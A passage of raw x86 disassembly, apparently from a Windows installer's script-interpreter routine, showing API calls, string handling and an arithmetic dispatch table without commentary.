  4016da:	ff 15 78 70 40 00    	call   *0x407078
  4016e0:	85 c0                	test   %eax,%eax
  4016e2:	74 24                	je     0x401708
  4016e4:	8b 45 08             	mov    0x8(%ebp),%eax
  4016e7:	3b c6                	cmp    %esi,%eax
  4016e9:	76 27                	jbe    0x401712
  4016eb:	66 39 18             	cmp    %bx,(%eax)
  4016ee:	74 22                	je     0x401712
  4016f0:	56                   	push   %esi
  4016f1:	e8 67 4c 00 00       	call   0x40635d
  4016f6:	3b c3                	cmp    %ebx,%eax
  4016f8:	74 0e                	je     0x401708
  4016fa:	83 c0 2c             	add    $0x2c,%eax
  4016fd:	50                   	push   %eax
  4016fe:	ff 75 08             	push   0x8(%ebp)
  401701:	e8 14 49 00 00       	call   0x40601a
  401706:	eb 0a                	jmp    0x401712
  401708:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40170f:	66 89 1f             	mov    %bx,(%edi)
  401712:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401715:	0f 85 31 13 00 00    	jne    0x402a4c
  40171b:	68 00 04 00 00       	push   $0x400
  401720:	57                   	push   %edi
  401721:	57                   	push   %edi
  401722:	ff 15 10 71 40 00    	call   *0x407110
  401728:	e9 1f 13 00 00       	jmp    0x402a4c
  40172d:	6a ff                	push   $0xffffffff
  40172f:	e8 8b 14 00 00       	call   0x402bbf
  401734:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401737:	51                   	push   %ecx
  401738:	56                   	push   %esi
  401739:	68 00 04 00 00       	push   $0x400
  40173e:	53                   	push   %ebx
  40173f:	50                   	push   %eax
  401740:	53                   	push   %ebx
  401741:	ff 15 14 71 40 00    	call   *0x407114
  401747:	85 c0                	test   %eax,%eax
  401749:	0f 85 fd 12 00 00    	jne    0x402a4c
  40174f:	e9 98 10 00 00       	jmp    0x4027ec
  401754:	6a ef                	push   $0xffffffef
  401756:	e8 64 14 00 00       	call   0x402bbf
  40175b:	50                   	push   %eax
  40175c:	56                   	push   %esi
  40175d:	e8 bc 44 00 00       	call   0x405c1e
  401762:	e9 45 fe ff ff       	jmp    0x4015ac
  401767:	6a 31                	push   $0x31
  401769:	e8 51 14 00 00       	call   0x402bbf
  40176e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401771:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401774:	ff 75 f4             	push   -0xc(%ebp)
  401777:	83 e0 07             	and    $0x7,%eax
  40177a:	89 45 08             	mov    %eax,0x8(%ebp)
  40177d:	e8 c3 42 00 00       	call   0x405a45
  401782:	ff 75 f4             	push   -0xc(%ebp)
  401785:	be a8 95 40 00       	mov    $0x4095a8,%esi
  40178a:	85 c0                	test   %eax,%eax
  40178c:	74 08                	je     0x401796
  40178e:	56                   	push   %esi
  40178f:	e8 86 48 00 00       	call   0x40601a
  401794:	eb 17                	jmp    0x4017ad
  401796:	68 00 50 43 00       	push   $0x435000
  40179b:	56                   	push   %esi
  40179c:	e8 79 48 00 00       	call   0x40601a
  4017a1:	50                   	push   %eax
  4017a2:	e8 27 42 00 00       	call   0x4059ce
  4017a7:	50                   	push   %eax
  4017a8:	e8 89 48 00 00       	call   0x406036
  4017ad:	56                   	push   %esi
  4017ae:	e8 fb 4a 00 00       	call   0x4062ae
  4017b3:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017b7:	7c 31                	jl     0x4017ea
  4017b9:	56                   	push   %esi
  4017ba:	e8 9e 4b 00 00       	call   0x40635d
  4017bf:	33 c9                	xor    %ecx,%ecx
  4017c1:	3b c3                	cmp    %ebx,%eax
  4017c3:	74 10                	je     0x4017d5
  4017c5:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4017c8:	83 c0 14             	add    $0x14,%eax
  4017cb:	51                   	push   %ecx
  4017cc:	50                   	push   %eax
  4017cd:	ff 15 c0 70 40 00    	call   *0x4070c0
  4017d3:	8b c8                	mov    %eax,%ecx
  4017d5:	8b 45 08             	mov    0x8(%ebp),%eax
  4017d8:	83 c0 fd             	add    $0xfffffffd,%eax
  4017db:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017e0:	23 c1                	and    %ecx,%eax
  4017e2:	f7 d8                	neg    %eax
  4017e4:	1b c0                	sbb    %eax,%eax
  4017e6:	40                   	inc    %eax
  4017e7:	89 45 08             	mov    %eax,0x8(%ebp)
  4017ea:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017ed:	75 06                	jne    0x4017f5
  4017ef:	56                   	push   %esi
  4017f0:	e8 d5 43 00 00       	call   0x405bca
  4017f5:	33 c0                	xor    %eax,%eax
  4017f7:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  4017fb:	0f 95 c0             	setne  %al
  4017fe:	40                   	inc    %eax
  4017ff:	50                   	push   %eax
  401800:	68 00 00 00 40       	push   $0x40000000
  401805:	56                   	push   %esi
  401806:	e8 e4 43 00 00       	call   0x405bef
  40180b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40180e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401811:	75 72                	jne    0x401885
  401813:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401816:	75 4f                	jne    0x401867
  401818:	57                   	push   %edi
  401819:	68 a8 a5 40 00       	push   $0x40a5a8
  40181e:	e8 f7 47 00 00       	call   0x40601a
  401823:	56                   	push   %esi
  401824:	57                   	push   %edi
  401825:	e8 f0 47 00 00       	call   0x40601a
  40182a:	ff 75 e8             	push   -0x18(%ebp)
  40182d:	68 a8 9d 40 00       	push   $0x409da8
  401832:	e8 05 48 00 00       	call   0x40603c
  401837:	68 a8 a5 40 00       	push   $0x40a5a8
  40183c:	57                   	push   %edi
  40183d:	e8 d8 47 00 00       	call   0x40601a
  401842:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401845:	c1 f8 03             	sar    $0x3,%eax
  401848:	50                   	push   %eax
  401849:	68 a8 9d 40 00       	push   $0x409da8
  40184e:	e8 0c 3f 00 00       	call   0x40575f
  401853:	83 e8 04             	sub    $0x4,%eax
  401856:	0f 84 57 ff ff ff    	je     0x4017b3
  40185c:	48                   	dec    %eax
  40185d:	74 1b                	je     0x40187a
  40185f:	56                   	push   %esi
  401860:	6a fa                	push   $0xfffffffa
  401862:	e9 2c fc ff ff       	jmp    0x401493
  401867:	ff 75 f4             	push   -0xc(%ebp)
  40186a:	6a e2                	push   $0xffffffe2
  40186c:	e8 08 39 00 00       	call   0x405179
  401871:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  401875:	e9 34 fd ff ff       	jmp    0x4015ae
  40187a:	ff 05 88 92 42 00    	incl   0x429288
  401880:	e9 d0 11 00 00       	jmp    0x402a55
  401885:	ff 75 f4             	push   -0xc(%ebp)
  401888:	6a ea                	push   $0xffffffea
  40188a:	e8 ea 38 00 00       	call   0x405179
  40188f:	ff 05 b4 92 42 00    	incl   0x4292b4
  401895:	53                   	push   %ebx
  401896:	53                   	push   %ebx
  401897:	ff 75 f8             	push   -0x8(%ebp)
  40189a:	ff 75 dc             	push   -0x24(%ebp)
  40189d:	e8 85 17 00 00       	call   0x403027
  4018a2:	ff 0d b4 92 42 00    	decl   0x4292b4
  4018a8:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
  4018ac:	8b f8                	mov    %eax,%edi
  4018ae:	75 06                	jne    0x4018b6
  4018b0:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
  4018b4:	74 12                	je     0x4018c8
  4018b6:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4018b9:	50                   	push   %eax
  4018ba:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4018bd:	53                   	push   %ebx
  4018be:	50                   	push   %eax
  4018bf:	ff 75 f8             	push   -0x8(%ebp)
  4018c2:	ff 15 1c 71 40 00    	call   *0x40711c
  4018c8:	ff 75 f8             	push   -0x8(%ebp)
  4018cb:	ff 15 20 71 40 00    	call   *0x407120
  4018d1:	3b fb                	cmp    %ebx,%edi
  4018d3:	0f 8d 73 11 00 00    	jge    0x402a4c
  4018d9:	83 ff fe             	cmp    $0xfffffffe,%edi
  4018dc:	75 13                	jne    0x4018f1
  4018de:	6a e9                	push   $0xffffffe9
  4018e0:	56                   	push   %esi
  4018e1:	e8 56 47 00 00       	call   0x40603c
  4018e6:	ff 75 f4             	push   -0xc(%ebp)
  4018e9:	56                   	push   %esi
  4018ea:	e8 47 47 00 00       	call   0x406036
  4018ef:	eb 08                	jmp    0x4018f9
  4018f1:	6a ee                	push   $0xffffffee
  4018f3:	56                   	push   %esi
  4018f4:	e8 43 47 00 00       	call   0x40603c
  4018f9:	68 10 00 20 00       	push   $0x200010
  4018fe:	56                   	push   %esi
  4018ff:	e9 7f 09 00 00       	jmp    0x402283
  401904:	53                   	push   %ebx
  401905:	eb 34                	jmp    0x40193b
  401907:	6a 31                	push   $0x31
  401909:	e8 b1 12 00 00       	call   0x402bbf
  40190e:	ff 75 d4             	push   -0x2c(%ebp)
  401911:	50                   	push   %eax
  401912:	e8 48 3e 00 00       	call   0x40575f
  401917:	3b c3                	cmp    %ebx,%eax
  401919:	0f 84 ff 0e 00 00    	je     0x40281e
  40191f:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  401922:	0f 84 4f 01 00 00    	je     0x401a77
  401928:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  40192b:	0f 85 1b 11 00 00    	jne    0x402a4c
  401931:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401934:	e9 1e 11 00 00       	jmp    0x402a57
  401939:	6a f0                	push   $0xfffffff0
  40193b:	e8 7f 12 00 00       	call   0x402bbf
  401940:	ff 75 d8             	push   -0x28(%ebp)
  401943:	50                   	push   %eax
  401944:	e8 c2 3e 00 00       	call   0x40580b
  401949:	e9 fe 10 00 00       	jmp    0x402a4c
  40194e:	6a 01                	push   $0x1
  401950:	e8 6a 12 00 00       	call   0x402bbf
  401955:	50                   	push   %eax
  401956:	e8 d5 46 00 00       	call   0x406030
  40195b:	e9 d1 0b 00 00       	jmp    0x402531
  401960:	6a 02                	push   $0x2
  401962:	e8 3b 12 00 00       	call   0x402ba2
  401967:	6a 03                	push   $0x3
  401969:	89 45 08             	mov    %eax,0x8(%ebp)
  40196c:	e8 31 12 00 00       	call   0x402ba2
  401971:	6a 01                	push   $0x1
  401973:	8b f8                	mov    %eax,%edi
  401975:	e8 45 12 00 00       	call   0x402bbf
  40197a:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40197d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401980:	66 89 1e             	mov    %bx,(%esi)
  401983:	74 09                	je     0x40198e
  401985:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401988:	0f 84 be 10 00 00    	je     0x402a4c
  40198e:	50                   	push   %eax
  40198f:	e8 9c 46 00 00       	call   0x406030
  401994:	3b fb                	cmp    %ebx,%edi
  401996:	7d 08                	jge    0x4019a0
  401998:	03 f8                	add    %eax,%edi
  40199a:	0f 88 ac 10 00 00    	js     0x402a4c
  4019a0:	3b f8                	cmp    %eax,%edi
  4019a2:	7e 02                	jle    0x4019a6
  4019a4:	8b f8                	mov    %eax,%edi
  4019a6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4019a9:	8d 04 78             	lea    (%eax,%edi,2),%eax
  4019ac:	50                   	push   %eax
  4019ad:	56                   	push   %esi
  4019ae:	e8 67 46 00 00       	call   0x40601a
  4019b3:	8b 7d 08             	mov    0x8(%ebp),%edi
  4019b6:	3b fb                	cmp    %ebx,%edi
  4019b8:	0f 84 8e 10 00 00    	je     0x402a4c
  4019be:	7d 0f                	jge    0x4019cf
  4019c0:	56                   	push   %esi
  4019c1:	e8 6a 46 00 00       	call   0x406030
  4019c6:	03 f8                	add    %eax,%edi
  4019c8:	79 05                	jns    0x4019cf
  4019ca:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4019cd:	8b fb                	mov    %ebx,%edi
  4019cf:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  4019d5:	0f 8d 71 10 00 00    	jge    0x402a4c
  4019db:	66 89 1c 7e          	mov    %bx,(%esi,%edi,2)
  4019df:	e9 68 10 00 00       	jmp    0x402a4c
  4019e4:	6a 20                	push   $0x20
  4019e6:	e8 d4 11 00 00       	call   0x402bbf
  4019eb:	6a 31                	push   $0x31
  4019ed:	8b f0                	mov    %eax,%esi
  4019ef:	e8 cb 11 00 00       	call   0x402bbf
  4019f4:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4019f7:	50                   	push   %eax
  4019f8:	56                   	push   %esi
  4019f9:	75 12                	jne    0x401a0d
  4019fb:	ff 15 18 71 40 00    	call   *0x407118
  401a01:	85 c0                	test   %eax,%eax
  401a03:	75 72                	jne    0x401a77
  401a05:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401a08:	e9 4a 10 00 00       	jmp    0x402a57
  401a0d:	ff 15 28 71 40 00    	call   *0x407128
  401a13:	eb ec                	jmp    0x401a01
  401a15:	33 ff                	xor    %edi,%edi
  401a17:	47                   	inc    %edi
  401a18:	57                   	push   %edi
  401a19:	e8 a1 11 00 00       	call   0x402bbf
  401a1e:	68 00 04 00 00       	push   $0x400
  401a23:	56                   	push   %esi
  401a24:	50                   	push   %eax
  401a25:	89 45 08             	mov    %eax,0x8(%ebp)
  401a28:	ff 15 24 71 40 00    	call   *0x407124
  401a2e:	85 c0                	test   %eax,%eax
  401a30:	74 13                	je     0x401a45
  401a32:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401a35:	74 14                	je     0x401a4b
  401a37:	56                   	push   %esi
  401a38:	ff 75 08             	push   0x8(%ebp)
  401a3b:	ff 15 28 71 40 00    	call   *0x407128
  401a41:	85 c0                	test   %eax,%eax
  401a43:	75 06                	jne    0x401a4b
  401a45:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a48:	66 89 1e             	mov    %bx,(%esi)
  401a4b:	66 89 9e fe 07 00 00 	mov    %bx,0x7fe(%esi)
  401a52:	e9 f5 0f 00 00       	jmp    0x402a4c
  401a57:	53                   	push   %ebx
  401a58:	e8 45 11 00 00       	call   0x402ba2
  401a5d:	6a 01                	push   $0x1
  401a5f:	8b f0                	mov    %eax,%esi
  401a61:	e8 3c 11 00 00       	call   0x402ba2
  401a66:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401a69:	75 08                	jne    0x401a73
  401a6b:	3b f0                	cmp    %eax,%esi
  401a6d:	7c 08                	jl     0x401a77
  401a6f:	7e 94                	jle    0x401a05
  401a71:	eb 0e                	jmp    0x401a81
  401a73:	3b f0                	cmp    %eax,%esi
  401a75:	73 08                	jae    0x401a7f
  401a77:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401a7a:	e9 d8 0f 00 00       	jmp    0x402a57
  401a7f:	76 84                	jbe    0x401a05
  401a81:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401a84:	e9 ce 0f 00 00       	jmp    0x402a57
  401a89:	6a 01                	push   $0x1
  401a8b:	e8 12 11 00 00       	call   0x402ba2
  401a90:	6a 02                	push   $0x2
  401a92:	8b f8                	mov    %eax,%edi
  401a94:	e8 09 11 00 00       	call   0x402ba2
  401a99:	8b c8                	mov    %eax,%ecx
  401a9b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401a9e:	83 f8 0c             	cmp    $0xc,%eax
  401aa1:	77 6d                	ja     0x401b10
  401aa3:	ff 24 85 6e 2b 40 00 	jmp    *0x402b6e(,%eax,4)
  401aaa:	03 f9                	add    %ecx,%edi
  401aac:	eb 62                	jmp    0x401b10
  401aae:	2b f9                	sub    %ecx,%edi
  401ab0:	eb 5e                	jmp    0x401b10
  401ab2:	0f af cf             	imul   %edi,%ecx
  401ab5:	8b f9                	mov    %ecx,%edi
  401ab7:	eb 57                	jmp    0x401b10
  401ab9:	3b cb                	cmp    %ebx,%ecx
  401abb:	74 42                	je     0x401aff
  401abd:	8b c7                	mov    %edi,%eax
  401abf:	99                   	cltd
  401ac0:	f7 f9                	idiv   %ecx
  401ac2:	8b f8                	mov    %eax,%edi
  401ac4:	eb 4a                	jmp    0x401b10
  401ac6:	0b f9                	or     %ecx,%edi
  401ac8:	eb 46                	jmp    0x401b10
  401aca:	23 f9                	and    %ecx,%edi
  401acc:	eb 42                	jmp    0x401b10
  401ace:	33 f9                	xor    %ecx,%edi
  401ad0:	eb 3e                	jmp    0x401b10
  401ad2:	33 c0                	xor    %eax,%eax
  401ad4:	3b fb                	cmp    %ebx,%edi
  401ad6:	0f 94 c0             	sete   %al
  401ad9:	eb e7                	jmp    0x401ac2
  401adb:	3b fb                	cmp    %ebx,%edi
  401add:	75 0e                	jne    0x401aed
  401adf:	eb 08                	jmp    0x401ae9
  401ae1:	33 ff                	xor    %edi,%edi
  401ae3:	eb 2b                	jmp    0x401b10
  401ae5:	3b fb                	cmp    %ebx,%edi
  401ae7:	74 f8                	je     0x401ae1
  401ae9:	3b cb                	cmp    %ebx,%ecx
  401aeb:	74 f4                	je     0x401ae1
  401aed:	33 ff                	xor    %edi,%edi
  401aef:	47                   	inc    %edi
  401af0:	eb 1e                	jmp    0x401b10
  401af2:	3b cb                	cmp    %ebx,%ecx
  401af4:	74 09                	je     0x401aff
  401af6:	8b c7                	mov    %edi,%eax
  401af8:	99                   	cltd
  401af9:	f7 f9                	idiv   %ecx
  401afb:	8b fa                	mov    %edx,%edi
  401afd:	eb 11                	jmp    0x401b10
  401aff:	33 ff                	xor    %edi,%edi
  401b01:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b08:	eb 06                	jmp    0x401b10
  401b0a:	d3 e7                	shl    %cl,%edi
  401b0c:	eb 02                	jmp    0x401b10
  401b0e:	d3 ff                	sar    %cl,%edi
  401b10:	57                   	push   %edi
  401b11:	e9 4f fa ff ff       	jmp    0x401565
  401b16:	6a 01                	push   $0x1
  401b18:	e8 a2 10 00 00       	call   0x402bbf
  401b1d:	6a 02                	push   $0x2
  401b1f:	8b f8                	mov    %eax,%edi
  401b21:	e8 7c 10 00 00       	call   0x402ba2
  401b26:	50                   	push   %eax
  401b27:	57                   	push   %edi
  401b28:	56                   	push   %esi
  401b29:	ff 15 e0 71 40 00    	call   *0x4071e0
  401b2f:	83 c4 0c             	add    $0xc,%esp
  401b32:	e9 15 0f 00 00       	jmp    0x402a4c
  401b37:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401b3a:	8b 3d ac bd 40 00    	mov    0x40bdac,%edi
  401b40:	3b c3                	cmp    %ebx,%eax
  401b42:	74 44                	je     0x401b88
  401b44:	48                   	dec    %eax
  401b45:	3b fb                	cmp    %ebx,%edi
  401b47:	0f 84 28 07 00 00    	je     0x402275
  401b4d:	8b 3f                	mov    (%edi),%edi
  401b4f:	3b c3                	cmp    %ebx,%eax
  401b51:	75 f1                	jne    0x401b44
  401b53:	3b fb                	cmp    %ebx,%edi
  401b55:	0f 84 1a 07 00 00    	je     0x402275
  401b5b:	83 c7 04             	add    $0x4,%edi
  401b5e:	be a8 95 40 00       	mov    $0x4095a8,%esi
  401b63:	57                   	push   %edi
  401b64:	56                   	push   %esi
  401b65:	e8 b0 44 00 00       	call   0x40601a
  401b6a:	a1 ac bd 40 00       	mov    0x40bdac,%eax
  401b6f:	83 c0 04             	add    $0x4,%eax
  401b72:	50                   	push   %eax
  401b73:	57                   	push   %edi
  401b74:	e8 a1 44 00 00       	call   0x40601a
  401b79:	a1 ac bd 40 00       	mov    0x40bdac,%eax
  401b7e:	56                   	push   %esi
  401b7f:	83 c0 04             	add    $0x4,%eax
  401b82:	50                   	push   %eax
  401b83:	e9 e8 0d 00 00       	jmp    0x402970
  401b88:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401b8b:	74 25                	je     0x401bb2
  401b8d:	3b fb                	cmp    %ebx,%edi
  401b8f:	0f 84 89 0c 00 00    	je     0x40281e
  401b95:	8d 47 04             	lea    0x4(%edi),%eax
  401b98:	50                   	push   %eax
  401b99:	56                   	push   %esi
  401b9a:	e8 7b 44 00 00       	call   0x40601a
  401b9f:	8b 07                	mov    (%edi),%eax
  401ba1:	57                   	push   %edi
  401ba2:	a3 ac bd 40 00       	mov    %eax,0x40bdac
  401ba7:	ff 15 08 71 40 00    	call   *0x407108
  401bad:	e9 9a 0e 00 00       	jmp    0x402a4c
  401bb2:	68 04 08 00 00       	push   $0x804
  401bb7:	6a 40                	push   $0x40
  401bb9:	ff 15 0c 71 40 00    	call   *0x40710c
  401bbf:	ff 75 d4             	push   -0x2c(%ebp)
  401bc2:	8b f0                	mov    %eax,%esi
  401bc4:	8d 46 04             	lea    0x4(%esi),%eax
  401bc7:	50                   	push   %eax
  401bc8:	e8 6f 44 00 00       	call   0x40603c
  401bcd:	a1 ac bd 40 00       	mov    0x40bdac,%eax
  401bd2:	89 06                	mov    %eax,(%esi)
  401bd4:	89 35 ac bd 40 00    	mov    %esi,0x40bdac
  401bda:	e9 6d 0e 00 00       	jmp    0x402a4c
  401bdf:	6a 03                	push   $0x3
  401be1:	e8 bc 0f 00 00       	call   0x402ba2
  401be6:	6a 04                	push   $0x4
  401be8:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401beb:	e8 b2 0f 00 00       	call   0x402ba2
  401bf0:	f6 45 e8 01          	testb  $0x1,-0x18(%ebp)
  401bf4:	89 45 08             	mov    %eax,0x8(%ebp)
  401bf7:	74 0a                	je     0x401c03
  401bf9:	6a 33                	push   $0x33
  401bfb:	e8 bf 0f 00 00       	call   0x402bbf
  401c00:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401c03:	f6 45 e8 02          	testb  $0x2,-0x18(%ebp)
  401c07:	74 0a                	je     0x401c13
  401c09:	6a 44                	push   $0x44
  401c0b:	e8 af 0f 00 00       	call   0x402bbf
  401c10:	89 45 08             	mov    %eax,0x8(%ebp)
  401c13:	83 7d d0 21          	cmpl   $0x21,-0x30(%ebp)
  401c17:	6a 01                	push   $0x1
  401c19:	75 44                	jne    0x401c5f
  401c1b:	e8 82 0f 00 00       	call   0x402ba2
  401c20:	6a 02                	push   $0x2
  401c22:	8b f8                	mov    %eax,%edi
  401c24:	e8 79 0f 00 00       	call   0x402ba2
  401c29:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401c2c:	c1 f9 02             	sar    $0x2,%ecx
  401c2f:	74 1e                	je     0x401c4f
  401c31:	8d 55 f8             	lea    -0x8(%ebp),%edx
  401c34:	52                   	push   %edx
  401c35:	51                   	push   %ecx
  401c36:	53                   	push   %ebx
  401c37:	ff 75 08             	push   0x8(%ebp)
  401c3a:	ff 75 ec             	push   -0x14(%ebp)
  401c3d:	50                   	push   %eax
  401c3e:	57                   	push   %edi
  401c3f:	ff 15 94 72 40 00    	call   *0x407294
  401c45:	f7 d8                	neg    %eax
  401c47:	1b c0                	sbb    %eax,%eax
  401c49:	40                   	inc    %eax
  401c4a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c4d:	eb 43                	jmp    0x401c92
  401c4f:	ff 75 08             	push   0x8(%ebp)
  401c52:	ff 75 ec             	push   -0x14(%ebp)
  401c55:	50                   	push   %eax
  401c56:	57                   	push   %edi
  401c57:	ff 15 20 72 40 00    	call   *0x407220
  401c5d:	eb 30                	jmp    0x401c8f
  401c5f:	e8 5b 0f 00 00       	call   0x402bbf
  401c64:	6a 12                	push   $0x12
  401c66:	8b f8                	mov    %eax,%edi
  401c68:	e8 52 0f 00 00       	call   0x402bbf
  401c6d:	66 8b 08             	mov    (%eax),%cx
  401c70:	66 f7 d9             	neg    %cx
  401c73:	1b c9                	sbb    %ecx,%ecx
  401c75:	23 c8                	and    %eax,%ecx
  401c77:	66 8b 07             	mov    (%edi),%ax
  401c7a:	66 f7 d8             	neg    %ax
  401c7d:	1b c0                	sbb    %eax,%eax
  401c7f:	51                   	push   %ecx
  401c80:	23 c7                	and    %edi,%eax
  401c82:	50                   	push   %eax
  401c83:	ff 75 08             	push   0x8(%ebp)
  401c86:	ff 75 ec             	push   -0x14(%ebp)
  401c89:	ff 15 78 72 40 00    	call   *0x407278
  401c8f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c92:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401c95:	0f 8c b1 0d 00 00    	jl     0x402a4c
  401c9b:	ff 75 f8             	push   -0x8(%ebp)
  401c9e:	e9 c2 f8 ff ff       	jmp    0x401565
  401ca3:	53                   	push   %ebx
  401ca4:	e8 f9 0e 00 00       	call   0x402ba2
  401ca9:	50                   	push   %eax
  401caa:	ff 15 70 72 40 00    	call   *0x407270
  401cb0:	85 c0                	test   %eax,%eax
  401cb2:	0f 84 4d fd ff ff    	je     0x401a05
  401cb8:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401cbb:	e9 97 0d 00 00       	jmp    0x402a57
  401cc0:	6a 02                	push   $0x2
  401cc2:	e8 db 0e 00 00       	call   0x402ba2
  401cc7:	50                   	push   %eax
  401cc8:	6a 01                	push   $0x1
  401cca:	e8 d3 0e 00 00       	call   0x402ba2
  401ccf:	50                   	push   %eax
  401cd0:	ff 15 6c 72 40 00    	call   *0x40726c
  401cd6:	e9 56 08 00 00       	jmp    0x402531
  401cdb:	a1 48 92 42 00       	mov    0x429248,%eax
  401ce0:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401ce3:	03 c1                	add    %ecx,%eax
  401ce5:	50                   	push   %eax
  401ce6:	6a eb                	push   $0xffffffeb
  401ce8:	53                   	push   %ebx
  401ce9:	e8 b4 0e 00 00       	call   0x402ba2
  401cee:	50                   	push   %eax
  401cef:	ff 15 74 72 40 00    	call   *0x407274
  401cf5:	e9 52 0d 00 00       	jmp    0x402a4c
  401cfa:	ff 75 d8             	push   -0x28(%ebp)
  401cfd:	ff 75 f4             	push   -0xc(%ebp)
  401d00:	ff 15 6c 72 40 00    	call   *0x40726c
  401d06:	8b f0                	mov    %eax,%esi
  401d08:	8d 45 ac             	lea    -0x54(%ebp),%eax
  401d0b:	50                   	push   %eax
  401d0c:	56                   	push   %esi
  401d0d:	ff 15 2c 72 40 00    	call   *0x40722c
  401d13:	8b 45 b8             	mov    -0x48(%ebp),%eax
  401d16:	6a 10                	push   $0x10
  401d18:	0f af 45 dc          	imul   -0x24(%ebp),%eax
  401d1c:	50                   	push   %eax
  401d1d:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  401d20:	0f af 45 dc          	imul   -0x24(%ebp),%eax
  401d24:	50                   	push   %eax
  401d25:	53                   	push   %ebx
  401d26:	53                   	push   %ebx
  401d27:	e8 93 0e 00 00       	call   0x402bbf
  401d2c:	50                   	push   %eax
  401d2d:	53                   	push   %ebx
  401d2e:	ff 15 58 72 40 00    	call   *0x407258
  401d34:	50                   	push   %eax
  401d35:	53                   	push   %ebx
  401d36:	68 72 01 00 00       	push   $0x172
  401d3b:	56                   	push   %esi
  401d3c:	ff 15 20 72 40 00    	call   *0x407220
  401d42:	3b c3                	cmp    %ebx,%eax
  401d44:	0f 84 02 0d 00 00    	je     0x402a4c
  401d4a:	50                   	push   %eax
  401d4b:	ff 15 5c 70 40 00    	call   *0x40705c
  401d51:	e9 f6 0c 00 00       	jmp    0x402a4c
  401d56:	ff 75 f4             	push   -0xc(%ebp)
  401d59:	ff 15 10 72 40 00    	call   *0x407210
  401d5f:	8b f8                	mov    %eax,%edi
  401d61:	6a 48                	push   $0x48
  401d63:	6a 5a                	push   $0x5a
  401d65:	57                   	push   %edi
  401d66:	ff 15 60 70 40 00    	call   *0x407060
  401d6c:	50                   	push   %eax
  401d6d:	6a 02                	push   $0x2
  401d6f:	e8 2e 0e 00 00       	call   0x402ba2
  401d74:	50                   	push   %eax
  401d75:	ff 15 54 71 40 00    	call   *0x407154
  401d7b:	57                   	push   %edi
  401d7c:	ff 75 f4             	push   -0xc(%ebp)
  401d7f:	f7 d8                	neg    %eax
  401d81:	a3 b0 bd 40 00       	mov    %eax,0x40bdb0
  401d86:	ff 15 14 72 40 00    	call   *0x407214
  401d8c:	6a 03                	push   $0x3
  401d8e:	e8 0f 0e 00 00       	call   0x402ba2
  401d93:	a3 c0 bd 40 00       	mov    %eax,0x40bdc0
  401d98:	8a 45 e4             	mov    -0x1c(%ebp),%al
  401d9b:	ff 75 d8             	push   -0x28(%ebp)
  401d9e:	8a c8                	mov    %al,%cl
  401da0:	80 e1 01             	and    $0x1,%cl
  401da3:	c6 05 c7 bd 40 00 01 	movb   $0x1,0x40bdc7
  401daa:	88 0d c4 bd 40 00    	mov    %cl,0x40bdc4
  401db0:	8a c8                	mov    %al,%cl
  401db2:	80 e1 02             	and    $0x2,%cl
  401db5:	24 04                	and    $0x4,%al
  401db7:	68 cc bd 40 00       	push   $0x40bdcc
  401dbc:	88 0d c5 bd 40 00    	mov    %cl,0x40bdc5
  401dc2:	a2 c6 bd 40 00       	mov    %al,0x40bdc6
  401dc7:	e8 70 42 00 00       	call   0x40603c
  401dcc:	68 b0 bd 40 00       	push   $0x40bdb0
  401dd1:	ff 15 54 70 40 00    	call   *0x407054
  401dd7:	e9 55 07 00 00       	jmp    0x402531
  401ddc:	53                   	push   %ebx
  401ddd:	e8 c0 0d 00 00       	call   0x402ba2
  401de2:	6a 01                	push   $0x1
  401de4:	8b f0                	mov    %eax,%esi
  401de6:	e8 b7 0d 00 00       	call   0x402ba2
  401deb:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401dee:	50                   	push   %eax
  401def:	56                   	push   %esi
  401df0:	75 0b                	jne    0x401dfd
  401df2:	ff 15 68 72 40 00    	call   *0x407268
  401df8:	e9 4f 0c 00 00       	jmp    0x402a4c
  401dfd:	ff 15 18 72 40 00    	call   *0x407218
  401e03:	e9 44 0c 00 00       	jmp    0x402a4c
